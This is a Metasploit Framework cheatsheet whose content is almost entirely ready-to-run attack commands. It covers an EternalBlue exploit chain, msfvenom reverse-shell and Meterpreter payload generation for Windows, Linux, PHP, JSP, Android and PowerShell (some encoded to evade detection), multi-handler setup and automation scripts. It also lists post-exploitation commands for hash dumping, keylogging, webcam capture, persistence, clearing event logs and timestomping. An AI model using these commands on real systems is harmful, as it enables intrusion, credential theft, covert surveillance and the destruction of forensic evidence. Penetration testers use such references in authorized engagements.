# Metasploit Framework Cheatsheet

## Quick Start

```bash
# Start console
msfconsole

# Quick exploit
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; set LHOST 192.168.1.100; exploit"
```

## Essential Commands

| Command | Description |
|---------|-------------|
| `msfconsole` | Start interactive console |
| `msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o FILE` | Generate payload |
| `msfdb init` | Initialize database |
| `msfconsole -r script.rc` | Run resource script |
| `msfconsole -x "commands"` | Execute commands |

## Console Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show help | `help` |
| `search` | Search modules | `search eternalblue` |
| `use` | Use module | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | Show options | `show options` |
| `set` | Set option | `set RHOSTS 192.168.1.1` |
| `show payloads` | List payloads | `show payloads` |
| `set payload` | Set payload | `set payload windows/x64/meterpreter/reverse_tcp` |
| `exploit` | Run exploit | `exploit` |
| `run` | Run module | `run` |
| `back` | Deselect module | `back` |
| `info` | Module info | `info` |
| `check` | Check if vulnerable | `check` |

## Database Commands

| Command | Description | Example |
|---------|-------------|---------|
| `db_status` | Database status | `db_status` |
| `hosts` | List hosts | `hosts` |
| `services` | List services | `services` |
| `vulns` | List vulns | `vulns` |
| `creds` | List creds | `creds` |
| `loot` | List loot | `loot` |
| `db_nmap` | Nmap scan | `db_nmap -sV 192.168.1.0/24` |
| `workspace` | Manage workspaces | `workspace -a pentest` |

## Session Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List sessions | `sessions` |
| `sessions -i` | Interact | `sessions -i 1` |
| `sessions -k` | Kill session | `sessions -k 1` |
| `sessions -u` | Upgrade shell | `sessions -u 1` |
| `sessions -l` | List verbose | `sessions -l` |

## Meterpreter Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sysinfo` | System info | `sysinfo` |
| `getuid` | Current user | `getuid` |
| `getpid` | Current process | `getpid` |
| `ps` | List processes | `ps` |
| `migrate` | Migrate process | `migrate PID` |
| `shell` | Drop to shell | `shell` |
| `download` | Download file | `download /etc/passwd` |
| `upload` | Upload file | `upload payload.exe` |
| `execute` | Execute file | `execute -f cmd.exe` |
| `hashdump` | Dump hashes | `hashdump` |
| `screenshot` | Take screenshot | `screenshot` |
| `keyscan_start` | Start keylogger | `keyscan_start` |
| `keyscan_dump` | Dump keystrokes | `keyscan_dump` |
| `webcam_snap` | Webcam capture | `webcam_snap` |
| `arp` | ARP table | `arp` |
| `ifconfig` | Network interfaces | `ifconfig` |
| `route` | Routing table | `route` |
| `portfwd` | Port forward | `portfwd add -l 8080 -p 80 -r 192.168.1.2` |
| `clearev` | Clear event logs | `clearev` |
| `persist` | Install persist | `persist` |
| `timestomp` | Modify timestamps | `timestomp file.exe -m "01/01/2020 00:00:00"` |

## msfvenom Payloads

| Payload | Description | Platform |
|---------|-------------|----------|
| `windows/meterpreter/reverse_tcp` | Reverse TCP | Windows |
| `windows/meterpreter/bind_tcp` | Bind TCP | Windows |
| `windows/shell/reverse_tcp` | Reverse Shell | Windows |
| `linux/x86/meterpreter/reverse_tcp` | Reverse TCP | Linux |
| `linux/x64/meterpreter/reverse_tcp` | Reverse TCP | Linux |
| `python/meterpreter/reverse_tcp` | Reverse TCP | Python |
| `java/meterpreter/reverse_tcp` | Reverse TCP | Java |
| `php/meterpreter/reverse_tcp` | Reverse TCP | PHP |
| `android/meterpreter/reverse_http` | Reverse HTTP | Android |
| `osx/x86/shell_reverse_tcp` | Reverse Shell | macOS |

## Output Formats

| Format | Extension | Description |
|--------|-----------|-------------|
| `exe` | .exe | Windows executable |
| `elf` | .elf | Linux executable |
| `msi` | .msi | Windows installer |
| `apk` | .apk | Android package |
| `py` | .py | Python script |
| `ps1` | .ps1 | PowerShell script |
| `vba` | .vba | VBA macro |
| `c` | .c | C source |
| `raw` | .bin | Raw payload |

## Common Workflow

### Phase 1: Reconnaissance
```bash
# Start msfconsole
msfconsole

# Initialize database
msfdb init

# Scan target
db_nmap -sV -p- 192.168.1.1

# View results
hosts
services
```

### Phase 2: Exploitation
```bash
# Search for exploit
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100

# Run exploit
exploit
```

### Phase 3: Post-Exploitation
```bash
# Get system info
sysinfo

# Dump hashes
hashdump

# Port forward
portfwd add -l 8080 -p 80 -r 192.168.1.2

# Migrate to stable process
ps
migrate PID
```

## Payload Generation

### Windows
```bash
# Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# With encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ps1 -o payload.ps1
```

### Linux
```bash
# Meterpreter reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

### Web
```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
```

### Android
```bash
# APK reverse HTTP
msfvenom -p android/meterpreter/reverse_http LHOST=192.168.1.100 LPORT=4444 -f apk -o payload.apk
```

## Handler Setup

```bash
# Start multi-handler
use exploit/multi/handler

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Set options
set LHOST 192.168.1.100
set LPORT 4444

# Run in background
exploit -j
```

## Resource Scripts

### Create Resource Script
```bash
cat > exploit.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
exploit
EOF
```

### Run Resource Script
```bash
msfconsole -r exploit.rc
```

## Automation Scripts

### Bash Automation
```bash
#!/bin/bash
# Auto exploit
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; set LHOST 192.168.1.100; exploit"
```

### Python Automation
```python
#!/usr/bin/env python3
import subprocess

cmd = """msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit" """
subprocess.run(cmd, shell=True)
```

## Quick Reference by Scenario

### EternalBlue (MS17-010)
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
exploit
```

### PHP Reverse Shell
```bash
# Generate
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# Upload shell.php to target

# Start handler
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

### Windows PowerShell
```bash
# Generate
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ps1 -o payload.ps1

# Execute on target
powershell -ExecutionPolicy Bypass -File payload.ps1
```

### Linux Reverse Shell
```bash
# Generate
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# Start listener
nc -lvp 4444
```

## Useful Aliases

```bash
# Add to ~/.bashrc
alias msf='msfconsole'
alias msfven='msfvenom'
alias msfhandle='msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"'
```

## Common Errors and Fixes

| Error | Solution |
|-------|----------|
| "Database not connected" | Run `msfdb init` |
| "Exploit failed" | Check options: `show options` |
| "No session created" | Verify LHOST/LPORT, check firewall |
| "Module not found" | Search: `search <keyword>` |

## Post-Exploitation Quick Reference

| Task | Command |
|------|---------|
| System info | `sysinfo` |
| User info | `getuid` |
| Dump hashes | `hashdump` |
| Screenshot | `screenshot` |
| Keylog start | `keyscan_start` |
| Keylog dump | `keyscan_dump` |
| Port forward | `portfwd add -l 8080 -p 80 -r TARGET` |
| Persistence | `persist` |
| Clear logs | `clearev` |
| Migrate | `migrate PID` |
